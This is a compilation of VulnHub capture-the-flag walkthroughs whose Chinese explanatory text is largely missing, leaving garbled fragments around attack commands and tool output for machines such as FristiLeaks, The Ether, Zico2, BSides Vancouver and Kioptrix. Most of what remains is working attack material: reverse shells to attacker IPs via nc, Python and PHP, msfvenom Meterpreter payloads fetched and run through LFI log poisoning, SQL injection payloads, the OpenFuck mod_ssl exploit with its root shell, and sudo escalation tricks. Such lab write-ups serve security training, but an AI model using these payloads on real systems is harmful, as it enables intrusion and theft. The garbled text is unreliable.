wget https://svwh.dl.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz tar zxvf dirb222.tar.gz cd dirb222/ apt-get install libcurl4-gnutls-dev ./configure && make ./dirb #
 VulnHub Walk-through ­ LazySysAdmin: 1 LazySysAdmin Vulnerable Machine Walk-through
 Freshly
Vulnhub-TopHatSec: Freshly


https://download.vulnhub.com/tophatsec/Freshly.ova

Virtualbox VM404 Virtualbox




OVAVirtualbox


   80 8080 8080443WebWordPress

wordpress  nikto 80 phpmyadminlogin.php login.php Sqlmap   WordPress8080wordpress 
shell
wordpressshellshell.zip  getshellshell404 NC 404 Shell passwd
 FristiLeaks v1.3



https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova.torrent https://download.vulnhub.com/fristilea ks/FristiLeaks_1.3.ova

Virtualbox ) Vnware Workstation player

VMwareMAC 08:00:27:A5:A6:76 VM

Netdiscover ­r 10.10.10.0/24
10.10.10.132

nmap -sS -Pn -T4 -p- 10.10.10.132 80serviceHTTP
80
8080 nmap -A -O -p80 10.10.10.132 
Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3) http-robots.txt: 3 disallowed entries
web nmap robots.txt   robots.txt    dirb http://10.10.10.132

 images   keep-calm  KEEP CALM AND DRINK FRISTI  http://10.10.10.132/fristi/ 
 dirb http://10.10.10.132/fristi/  upload index  eezeepz  eezeepz  base64  base64 -d /tmp/encoded.txt PNGPNG base64 -d /tmp/encoded.txt > decoded.png  
username:eezeepz password:keKkeKKeKKeKkEkkEk
shell Shellhttp://pentestmonkey.net/tools/web-shells/php-reverse-shell
cp /usr/share/webshells/php/php-reverse-shell.php reverse-shell.php vi reverse-shell.php
shellip  nc  nc -nlvp 8888 png, jpg, gif   .jpg

shell


 home 
eezeepz  notes.txt 
/tmp runtis 

 notes.txt  /tmp/runtis  /home/admin 
 /home/admin   cryptpass.py Cryptepass.txt whoisyourgodnow.txt py 

 1.mVGZ3O3omkJLmy2pcuTq thisisalsopw123 2.=RFn0AKnlMHMPIzpyuTI0ITG LetThereBeFristi!
fristgod 
  su  Bsutty  A su 

Python -c 'import pty;pty.spawn("/bin/sh")' 
  .secret_admin_stuff  root   history   fristigod sudo    sudo shell sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash /root flagflag
 The Ether


http://www.mediafire.com/file/502nbnbkarsoisb/theEther.zip

VMwareVulnhub vmx   Kalivirtualbox

 Flag  

ip

Kali fping fping -asg 192.168.1.0/24 IP
 nmap -F  192.168.1.0/24   Mac  192.168.1.1 TP-Link 192.168.1.100  192.168.1.101  VMware 192.168.1.101 IP IPNmap nmap -A -v 192.168.1.101 -oN nmap.txt 
-A IP -v  -oN  nmap.txt  
 nmap 22  80  Ubuntu  22  SSH  80  http Web Apache/2.4.18  WebWeb
Web
1. niktoWeb
niktoWeb nikto -h 192.168.1.101  -h   images  /icons/README 
2. dirb
dirb http://192.168.1.101 
3. 
  ABOUT US URL http://192.168.1.101/?file=about.php 
4. 
Burpsuitehttp Linux  /etc/passwd  Apache

/var/log/apache/access.log /var/log/apache2/access.log /var/www/logs/access.log /var/log/access.log
 Apache2 /etc/apache2/apache2.conf  phpphp file=php://filter/convert.base64-encode/resource=index.php :  http  ssh Apachessh ssh
shell
1. Webshell
ssh ssh '<?php eval($_GET['f']); ?>'@192.168.1.101 SSHssh 
2. msfvenomMeterpreter shell
MsfMsf Linuxshell msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 -f elf > shell.elf
3. Metasploit 
use exploit/multi/handler set payload linux/x86/meterpreter/reverse_tcp set lhost 192.168.1.102 exploit
4. Meterpreter shell
PythonWeb Server python -m SimpleHTTPServer 80  

1. /?file=/var/log/auth.log&f=system('wget+192.168.1.102/shell.elf')%3b 2. /?file=/var/log/auth.log&f=system('chmod+%2bx+shell.elf')%3b 3. /?file=/var/log/auth.log&f=system('./shell.elf')%3b : 1. payloadurlencode 2.  shell.elf 
  Web Servermsf

Linux
1. 
Meterpreter shell  Ubuntu 16.04 (Linux 4.10.0-40-generic) Ubuntu16.04exp exp https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c 
2. msf
use post/multi/recon/local_exploit_suggester 
3. SUID
shellbashshell python -c 'import pty;pty.spawn("/bin/bash")' Web xxxlogauditorxxx.py   py Apache2 cat   pySUIDroot sudo --list  rootpy pyroot rootshell

4. rootshell
Msfvenom shell  background   rootmsf
sudo ./xxxlogauditorxxx.py /var/log/apache2/access.log|./shell.elf
py session 2shell
flag
root flag.png    base64 base64 flag.txt get flag cat flag | base64 -d


1. Web
index.php
<?php $file = $_GET["file"];
$file = str_ireplace("etc","", $file); $file = str_ireplace("php:","", $file); $file = str_ireplace("expect:","", $file); $file = str_ireplace("data:","", $file); $file = str_ireplace("proc","", $file); $file = str_ireplace("home","", $file); $file = str_ireplace("opt","", $file);
if ($file == "/var/log/auth.log") { header("location: index.php"); } else{ include($file); }

include($file); ?>
 index.php  
  php: 
passwd  etc 
Apache  www-data ApacheApache
2. 
 32exp64

 1. PHP 2. SSH 3. LFISSHgetshell 4. MSF 5. SUID
 1. Fuzz 2. NCshellshell
Metasploit Framework  WebSSH 
 zico2


https://download.vulnhub.com/zico/zico2.ova


OVAvirtualboxVulnhubviirtualbox   Kali

 rootflag 

ip Kali nmap nmap -sP 192.168.1.0/24 IP  nmap -F  192.168.1.0/24   Mac  192.168.1.3 VirtualBox IPNmap nmap -A -v 192.168.1.3 -oN nmap.txt 
-A IP -v  -oN  nmap.txt  
 nmap 22  80  111  Linux  22  SSH  80  http Web Apache/2.2.22  WebWeb
Web
1. dirb
dirb http://192.168.1.3  dbadmin
2. 
 http://192.168.1.3/dbadmin/  test_db.php 

3. 
 http://192.168.1.3/dbadmin/test_db.php MySQLphpmyadminsqlite   admin 
4. phpLiteAdmin
somd5.com  
root 34kroot34 zico zico2215@
5. 
http://192.168.1.3/view.php?page=tools.html Linuxpasswd
Webshell
1. getshell
SqliteAccess  shell.php shell.php  /usr/databases/test_users  ../../var/www/html/shell.php   / 
2. getshell
payload: ATTACH DATABASE '/var/www/html/shell.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?php phpinfo();?>'); 
1. SQL 2.  
3. phpliteadmingetshell
getshell 1. phpliteadmin

2. getshell
4. Meterpreter shell
msf msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.3 LPORT=4444 -f elf > ~/Desktop/msf.elf PythonWeb Server python -m SimpleHTTPServer 80   x=system('wget http://192.168.1.4:9999/msf.elf');  x=system('ls');  /tmp  x=system('wget http://192.168.1.4:9999/msf.elf -O /tmp/msf.elf');  
x=system('chmod +x /tmp/msf.elf'); x=system('/tmp/msf.elf'); 

Linux
1. msf
use post/multi/recon/local_exploit_suggester 
2. 
Meterpreter shell  Ubuntu 12.04 (Linux 3.2.0-23-generic)  www.exploit-db.com exp EXP https://www.exploit-db.com/exploits/33589/

 MeterpretershellC shellPython spawnshell python -c 'import pty;pty.spawn("/bin/bash")'  exp
flag
root flag.txt 


1. phpliteadmin
 /var/www  /var/www/html  www shell  /var/www/ shell
2.phpliteadmingetshell
 shell 

 1. phpliteadmin 2. phpliteadmin 3. LFIgetshell 4. MSF 5. root
 1. FuzzSSHgetshell 2. Fuzzphpliteadminshell
Webphpliteadmin 

 Quaoar


https://download.vulnhub.com/hackfest2016/Quaoar.ova

OVAvirtualboxVulnhubviirtualbox   Kali

 flagroot  nmap dirb / dirbuster / BurpSmartBuster nikto wpscan hydra

ip Kali IP  IPNmap nmap -A -v 192.168.1.3 -oN nmap.txt 
-A IP -v  -oN  nmap.txt  
 nmap 22  80  Linux  22  SSH  80  http Web Apache/2.2.22  WebWeb
Web
1. dirb

dirb http://172.19.0.182 robots.txtuploadwordpress robots.txtwordpress
2. 
wpscan
wpscan -u http://172.19.0.182/wordpress --wp-content-dir wp-content --enumerate u
[+] Enumerating usernames ... [+] Identified the following 2 user/s:
+----+--------+--------+ | Id | Login | Name | +----+--------+--------+ | 1 | admin | admin | | 2 | wpuser | wpuser | +----+--------+--------+ [!] Default first WordPress username 'admin' is still used
[+] Finished: Fri Jul 6 22:13:24 2018 [+] Requests Done: 62 [+] Memory used: 63.867 MB [+] Elapsed time: 00:00:05
 admin admin 
Webshell
1. shell
cp /usr/share/webshells/php/php-reverse-shell.php shelly.php shellNCshell pythonshell `python -c 'import pty; pty.spawn("/bin/bash")' shell

1. 

wordpress root
root flag
 SickOs 1.1


https://download.vulnhub.com/sickos/sick0s1.1.7z

OVFVMware WorkstationVulnhubVMware Workstation NATIP NATIP192.168.202.128

root/root/a0216ea4d51874464078c618298b1367.txt

ip 192.168.202.1/24nmapIP192.168.202.133
 IP

squidhttp://192.168.202.133/ 
IP
Web

robots.txt:

wolfcms http://192.168.202.133/wolfcms/?/admin/ admin/admincms<0.8.3.1,

webshell

webshell:


3306mysql5.1udf

shell

cgi-binbashgetshellncshell

susudo,

 
root sickos

sickosjohn@123 sudo


1.bashshell 2.
 BSides-Vancouver-2018-Workshop


https://download.vulnhub.com/bsidesvancouver2018/BSides-Vancouver-2018-Workshop.ova

ValualBoxroot

Boot to rootrootFlag

ValualBoxhost-onlyKali VMWareIPValualBoxIP WindowsNmapBurpsuitWiresharkSqlmapnc HydraPython2.7DirBusterAWVSNessusKali Linux 

IP nmapCIP nmap -sP 192.168.56.0/24 IP 192.168.56.101
 Nmap nmap -p1-65535 -open -A 192.168.56.101 -oN BSides.txt     21 FTP vsftpd2.3.5  22 ssh OpenSSH 5.9p1 80 http Apache httpd 2.2.22 (Ubuntu)


 0x01 FTP WindowsXFTPFTPpublicusers.txt.bk 5abatchyjohnmaiannedoomguy 0x02 5ssh WindowsHydra Windows"V1.0" 4 darkweb2017-top10000.txt anne princess 0x03 sshsudoflag Xshellsshanne princess idsudo -lannesudo sudo -l /rootsudo cat /root/flag.txtflag  0x01  Kali bsidesKalibsides IPNampCbsidesIP172.20.10.8KaliIP 172.20.10.9 Nmap nmap -sP 192.168.56.0/24 FTP5abatchyjohnmaiannedoomguy 0x02 80http  http://172.20.10.8/  http://172.20.10.8/robots.txt /backup_wordpress  http://172.20.10.8/backup_wordpress/ WordPress 0x03 wpscanWordPress (1) wpscan -u http://172.20.10.8/backup_wordpress --enumerate u admin john (2)wpscan wpscan --url wpscan -u http://172.20.10.8/backup_wordpress --wordlist /root/share/darkweb2017top10000.txt --username john darkweb2017-top10000.txt john enigma
shell

0x04 shell (1) john enigmaWordPress http://172.20.10.8/backup_wordpress/wplogin.php (2)WordPressshell Appearance -> Editor  Theme Header   <?php system($_GET['cmd']); ?>  (3)Burpsuitcmd 172.20.10.8/backup_wordpress/?cmd=id;ls idls (4)ncshell  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.20.10.5 4444 >/tmp/f urlBurpsuit (5)Windowsncshell (6) echo '<?php eval($_POST['123456']);?>' >> caidao.php 

0x5  (1) /usr/local/bin/cleanup 777  #!/bin/sh
rm -rf /var/log/apache2/* # Clean those damn logs!! Apacheroot cleanup777shell (2)cleanupshell /usr/local/lib/python2.7/ Python2.7 Pythonshell python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.10.5",5555) );os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","i"]);' (3)WindowsNCshellroot (4)flag:


1. 2.LinuxshellbashncphpPython 3.WordPressgetshell 4.sshWordPress

 Kioptrix 1

title: Vulnhub-Kioptrix 1 date: 2018-05-07 15:28:05 categories: 
Ukonw 
 netdiscover IP

root@kali:~# netdiscover

Currently scanning: 192.168.63.0/16 | Screen View: Unique Hosts

3 Captured ARP Req/Rep packets, from 3 hosts. Total size: 180

_____________________________________________________________________________

IP

At MAC Address

Count

Len MAC Vendor / Hostname

-----------------------------------------------------------------------------

192.168.43.1 ac:c1:ee:31:3f:25

1

60 Xiaomi Communications Co L

192.168.43.33 44:03:2c:68:d8:0f

1

60 Intel Corporate

192.168.43.54 00:0c:29:7c:3a:16

1

60 VMware, Inc.

IP 192.168.43.54 nmap IP nmap -A 192.168.43.54

root@kali:~# nmap -A -sS 192.168.43.54

Starting Nmap 7.10 ( https://nmap.org ) at 2018-05-07 15:48

mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --

system-dns or specify valid servers with --dns-servers

Nmap scan report for 192.168.43.54

Host is up (0.00055s latency).

Not shown: 994 closed ports

PORT

STATE SERVICE

VERSION

22/tcp open ssh

OpenSSH 2.9p2 (protocol 1.99)

| ssh-hostkey:

| 1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)

| 1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)

|_ 1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)

|_sshv1: Server supports SSHv1

80/tcp open http

Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4

OpenSSL/0.9.6b)

| http-methods:

|_ Potentially risky methods: TRACE

|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

|_http-title: Test Page for the Apache Web Server on Red Hat Linux

111/tcp open rpcbind

2 (RPC #100000)

| rpcinfo:

| program version port/proto service

| 100000 2

111/tcp rpcbind

| 100000 2

111/udp rpcbind

| 100024 1

1024/tcp status

|_ 100024 1

1024/udp status

139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP)

443/tcp open ssl/http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4

OpenSSL/0.9.6b)

| http-methods:

|_ Potentially risky methods: TRACE

|_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b

|_http-title: Test Page for the Apache Web Server on Red Hat Linux

| ssl-cert: Subject:

commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/

countryName=--

| Not valid before: 2009-09-26T09:32:06

|_Not valid after: 2010-09-26T09:32:06

|_ssl-date: 2018-05-07T07:50:42+00:00; +1m50s from scanner time.

| sslv2:

| SSLv2 supported

| ciphers:

|

SSL2_DES_192_EDE3_CBC_WITH_MD5

|

SSL2_RC2_128_CBC_WITH_MD5

|

SSL2_RC4_128_WITH_MD5

|

SSL2_RC4_64_WITH_MD5

|

SSL2_DES_64_CBC_WITH_MD5

|

SSL2_RC2_128_CBC_EXPORT40_WITH_MD5

|_ SSL2_RC4_128_EXPORT40_WITH_MD5

1024/tcp open status

1 (RPC #100024)

MAC Address: 00:0C:29:7C:3A:16 (VMware)

Device type: general purpose

Running: Linux 2.4.X

OS CPE: cpe:/o:linux:linux_kernel:2.4

OS details: Linux 2.4.9 - 2.4.18 (likely embedded)

Network Distance: 1 hop

Host script results: |_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE

HOP RTT

ADDRESS

1 0.55 ms 192.168.43.54

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 51.99 seconds

443/tcp open ssl/http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) 443 mod_ssl/2.8.4 OpenSSL/0.9.6b  searchsploit mod_ssl 

root@kali:~/Desktop# searchsploit mod_ssl

--------------------------------------- ----------------------------------------

Exploit Title

| Path

| (/usr/share/exploitdb/)

--------------------------------------- ----------------------------------------

Apache mod_ssl 2.0.x - Remote Denial o | exploits/linux/dos/24590.txt

Apache mod_ssl 2.8.x - Off-by-One HTAc | exploits/multiple/dos/21575.txt

Apache mod_ssl < 2.8.7 OpenSSL - 'Open | exploits/unix/remote/21671.c

Apache mod_ssl < 2.8.7 OpenSSL - 'Open | exploits/unix/remote/764.c

Apache mod_ssl OpenSSL < 0.9.6d / < 0. | exploits/unix/remote/40347.txt

--------------------------------------- ----------------------------------------

Shellcodes: No Result

4exp exploit-db exp


OpenFuck
exp
 libssl-dev  apt-get install libssl1.0-dev exp <openssl/rc4.h>  <openssl/md5.h>
expwget url http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c 961,const unsigned char * p* end;


gcc -o OpenFuck 764.c -lcrypto
 ./OpenFuck   0x6b  ./OpenFuck 0x6b 192.168.43.54

root@kali:~/Desktop# ./OpenFuck 0x6b 192.168.43.54

*******************************************************************

* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *

*******************************************************************

* by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE *

* #hackarena irc.brasnet.org

*

* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *

* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *

* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *

*******************************************************************

Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f80e0 Ready to send shellcode

Spawning shell... bash: no job control in this shell bash-2.05$ bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/030exploits/ptracekmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; --04:04:37-- http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
=> `ptrace-kmod.c' Connecting to dl.packetstormsecurity.net:80... connected! HTTP request sent, awaiting response... 301 Moved Permanently Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following] --04:04:38-- https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
=> `ptrace-kmod.c' Connecting to dl.packetstormsecurity.net:443... connected! HTTP request sent, awaiting response... 200 OK Length: 3,921 [text/x-csrc]

0K ...

100% @ 3.74 MB/s

04:04:39 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]

[+] Attached to 6498 [+] Waiting for signal [+] Signal caught [+] Shellcode placed at 0x4001189d [+] Now wait for suid shell... id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) whoami root

Samba
samba  enum4linux SMBWindowsSAMBA  samba  Samba trans2openLinux x86 Samba 2.2.02.2.8.  searchsploit  msf

msf exploit(linux/samba/trans2open) > show options

Module options (exploit/linux/samba/trans2open):

Name ---RHOST RPORT

Current Setting Required Description

--------------- -------- -----------

192.168.43.54 yes

The target address

139

yes

The target port (TCP)

Payload options (linux/x86/shell_bind_tcp):

Name ---LPORT RHOST

Current Setting Required Description

--------------- -------- -----------

4444

yes

The listen port

192.168.43.54 no

The target address

Exploit target:
Id Name -- ---0 Samba 2.2.x - Bruteforce
msf exploit(linux/samba/trans2open) > exploit
[*] Started bind handler [*] 192.168.43.54:139 - Trying return address 0xbffffdfc... [*] 192.168.43.54:139 - Trying return address 0xbffffcfc... [*] 192.168.43.54:139 - Trying return address 0xbffffbfc... [*] 192.168.43.54:139 - Trying return address 0xbffffafc... [*] Command shell session 2 opened (192.168.43.177:33375 -> 192.168.43.54:4444) at 2018-05-07 04:47:42 -0400
id uid=0(root) gid=0(root) groups=99(nobody)

  kali linux 

 Zico2

title: Vulnhub - Zico2 date: 2018-05-05 22:30:35 categories: 
Ukonw vulnhub

https://www.vulnhub.com/entry/zico2-1,210/


Kali Linux VirtualBox

IPVirtualBox Host-Only  IP kali linux netdiscover ARP  netdiscover :
IP 192.168.56.102  nmap  nmap -A 192.168.56.102

80Web Web


view.php?page=tools.html  ../../etc/passwd

 Host-Only   Kali 
 kali  dirb 

 dbadmin 
 phpLiteAdmin  v1.9.3 PHP  kali  Searchsploit Exploit-DB 

PHP  admin   exploit-db shell ncshellmsfphp  exploit-db  .php  shell


 /var/www/html txt <?php $sock=fsockopen("192.168.56.101",2333);exec("/bin/sh -i <&3 >&3 2>&3");?>
apache web service apache2 start
 TEXT ,PHPshell <?php system("wget 192.168.56.101/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>

HTTP  
/usr/databases/shell.php nc 2333
shell


shell /home/zico wordpress CMS wp-config.php
zico ssh  ssh zico@192.168.56.102
 sudo -l 

 zico root tar  zip   touch exploit  zip 
sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'" sudo  -T  --unzip-commandpython shell
 root  /root  cat /root/flag.txt flag


vulnhub  kali linux  netdiscover ARP arp ICMP(ping) ICMP
shellphppythonReverse Shell Cheat Sheet
touch exploit   zip 
425 
 Kioptrix 3
title: Vulnhub-Kioptrix 3 date: 2018-05-08 20:01:26 categories: 
Ukonw

 netdiscover 

root@kali:~# netdiscover

Currently scanning: 192.168.194.0/16 | Screen View: Unique Hosts

13 Captured ARP Req/Rep packets, from 4 hosts. Total size: 780

_____________________________________________________________________________

IP

At MAC Address

Count

Len MAC Vendor / Hostname

-----------------------------------------------------------------------------

192.168.43.1 ac:c1:ee:31:3f:25

6

360 Xiaomi Communications Co Ltd

192.168.43.33 44:03:2c:68:d8:0f

2

120 Intel Corporate

192.168.43.58 00:0c:29:b2:76:40

4

240 VMware, Inc.

192.168.43.158 00:0c:29:38:2d:6f

1

60 VMware, Inc.

IP 192.168.43.158  nmap

root@kali:~# nmap -A -sS -n 192.168.43.158

Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-08 07:45 EDT

Nmap scan report for 192.168.43.158

Host is up (0.00053s latency).

Not shown: 998 closed ports

PORT STATE SERVICE VERSION

22/tcp open ssh

OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)

| ssh-hostkey:

| 1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)

|_ 2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)

80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)

| http-cookie-flags:

| /:

|

PHPSESSID:

|_

httponly flag not set

|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch

|_http-title: Ligoat Security - Got Goat? Security ...

MAC Address: 00:0C:29:38:2D:6F (VMware)

Device type: general purpose

Running: Linux 2.6.X

OS CPE: cpe:/o:linux:linux_kernel:2.6

OS details: Linux 2.6.9 - 2.6.33

Network Distance: 1 hop

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE

HOP RTT

ADDRESS

1 0.53 ms 192.168.43.158

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds



22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
OS details: Linux 2.6.9 - 2.6.33 80cms Lotus CMS 
 dirb  phpdamin
cms http://192.168.43.158/index.php?system=Admin


&
80WEB
url http://192.168.43.158/index.php?system=Blog  system=../../../../../etc/passwd

 %00.  /etc/passwd http://192.168.43.158/index.php?system=../../../../../../../../etc/passwd%00.
SQLmapshell root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.177 LPORT=443 -f raw > /tmp/evil.jpg No platform was selected, choosing Msf::Module::Platform::PHP from the payload No Arch selected, selecting Arch: php from the payload No encoder or badchars specified, outputting raw payload Payload size: 1114 bytes
 msfvenom    msf



http://kioptrix3.com/index.php? system=../../../../../../../home/www/kioptrix3.com/gallery/photos/thumb_1a2o44437j.jpg%00.
shell

msf > use multi/handler msf exploit(multi/handler) > set PAYLOAD php/meterpreter/reverse_tcp PAYLOAD => php/meterpreter/reverse_tcp msf exploit(multi/handler) > set LHOST 192.168.43.177 LHOST => 192.168.43.177 msf exploit(multi/handler) > set LPORT 443 LPORT => 443 msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.43.177:443 [*] Sending stage (37775 bytes) to 192.168.43.158 [*] Meterpreter session 1 opened (192.168.43.177:443 -> 192.168.43.158:51226) at 2018-05-08 12:53:09 -0400

meterpreter > ls Listing: /home/www/kioptrix3.com ================================

Mode ---40777/rwxrwxrwx 40777/rwxrwxrwx 40777/rwxrwxrwx 100644/rw-r--r-40755/rwxr-xr-x 100644/rw-r--r-100644/rw-r--r-40777/rwxrwxrwx 40777/rwxrwxrwx 100644/rw-r--r--

Size ---4096 4096 4096 23126 4096 26430 399 4096 4096 243

Type ---dir dir dir fil dir fil fil dir dir fil

Last modified ------------2011-04-15 09:21:17 -0400 2011-04-14 12:24:17 -0400 2011-04-14 12:24:17 -0400 2011-04-14 12:23:13 -0400 2011-04-14 11:32:31 -0400 2011-04-14 12:23:13 -0400 2011-04-14 12:23:13 -0400 2011-04-14 12:24:17 -0400 2011-04-14 12:24:17 -0400 2011-04-14 12:23:13 -0400

Name ---cache core data favicon.ico gallery gnu-lgpl.txt index.php modules style update.php


SQLmapSQL
302 kioptrix3.com  etc/passwd 

192.168.43.158 kioptrix3.com service networking restart  urlSQL kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos

 sqlmap id



Database: gallery

Table: dev_accounts

[2 entries]

+----+------------+---------------------------------------------+

| id | username | password

|

+----+------------+---------------------------------------------+

| 1 | dreg

| 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r) |

| 2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |

+----+------------+---------------------------------------------+



 http://kioptrix3.com/gallery/gadmin/
Database: gallery Table: gallarific_users [2 entries] +----------+----------+ | username | password | +----------+----------+ | admin | n0t7t1k4 | +----------+----------+
  root  dba sqlmapshell
sqli
http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,3,4,5,6#
6
http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,version(),database(),4,5,6#

 http://kioptrix3.com/gallery/gallery.php? id=1%20union%20select%201,group_concat(table_name),3,4,5,6%20from%20information_schema.tables%20w here%20table_schema%20=%20database()#
 http://kioptrix3.com/gallery/gallery.php? id=1%20union%20select%201,group_concat(column_name),3,4,5,6%20FROM%20information_schema.columns%2 0WHERE%20table_name%20=0x6465765f6163636f756e7473#


http://kioptrix3.com/gallery/gallery.php? id=1%20union%20select%201,group_concat(username,0x3a,password),3,4,5,6%20FROM%20dev_accounts#

Lotus CMS 

root@kali:~# searchsploit Lotus CMS

------------------------------------------------------- ----------------------------------------

Exploit Title

| Path

| (/usr/share/exploitdb/)

------------------------------------------------------- ----------------------------------------

Lotus CMS Fraise 3.0 - Local File Inclusion / Remote C | exploits/php/webapps/15964.py

Lotus Core CMS 1.0.1 - Remote File Inclusion

| exploits/php/webapps/5866.txt

LotusCMS 3.0 - 'eval()' Remote Command Execution (Meta | exploits/php/remote/18565.rb

LotusCMS 3.0.3 - Multiple Vulnerabilities

| exploits/php/webapps/16982.txt

------------------------------------------------------- ----------------------------------------

Shellcodes: No Result

 

  LotusCMS 3.0 - 'eval()' Remote Command Execution rb 

msf > search LotusCMS

Matching Modules ================

Name ---exploit/multi/http/lcms_php_exec Command Execution

Disclosure Date --------------2011-03-03

Rank ---excellent

Description ----------LotusCMS 3.0 eval() Remote



msf > use exploit/multi/http/lcms_php_exec msf exploit(multi/http/lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

Name ---Proxies [...] RHOST RPORT SSL URI VHOST

Current Setting ---------------
80 false /lcms/

Required -------no
yes yes no yes no

Description ----------A proxy chain of format type:host:port[,type:host:port]
The target address The target port (TCP) Negotiate SSL/TLS for outgoing connections URI HTTP server virtual host

Exploit target:
Id Name -- ---0 Automatic LotusCMS 3.0

msf exploit(multi/http/lcms_php_exec) > set RHOST 192.168.43.58 RHOST => 192.168.43.58 msf exploit(multi/http/lcms_php_exec) > set PAYLOAD generic/shell_bind_tcp PAYLOAD => generic/shell_bind_tcp msf exploit(multi/http/lcms_php_exec) > set URI / URi => / msf exploit(multi/http/lcms_php_exec) > show options

Module options (exploit/multi/http/lcms_php_exec):

Name

Current Setting Required Description

---Proxies [...] RHOST RPORT SSL URI VHOST

---------------
192.168.43.58 80 false /

-------no
yes yes no yes no

----------A proxy chain of format type:host:port[,type:host:port]
The target address The target port (TCP) Negotiate SSL/TLS for outgoing connections URI HTTP server virtual host

Payload options (generic/shell_bind_tcp):

Name ---LPORT RHOST

Current Setting --------------4444 192.168.43.58

Required -------yes no

Description ----------The listen port The target address

Exploit target:
Id Name -- ---0 Automatic LotusCMS 3.0

msf exploit(multi/http/lcms_php_exec) > run
[*] Started bind handler [-] Exploit failed [unreachable]: Rex::HostUnreachable The host (192.168.43.58:80) was unreachable. [*] Exploit completed, but no session was created. msf exploit(multi/http/lcms_php_exec) > set RHOST 192.168.43.158 RHOST => 192.168.43.158 msf exploit(multi/http/lcms_php_exec) > run
[*] Started bind handler [*] Using found page param: /index.php?page=index [*] Sending exploit ... [*] Command shell session 1 opened (192.168.43.177:44505 -> 192.168.43.158:4444) at 2018-05-08 10:02:56 -0400
whoami www-data id uid=33(www-data) gid=33(www-data) groups=33(www-data) ls cache core data favicon.ico gallery gnu-lgpl.txt index.php

modules style update.php pwd /home/www/kioptrix3.com

 cd  gallery   ls -l  gallery 

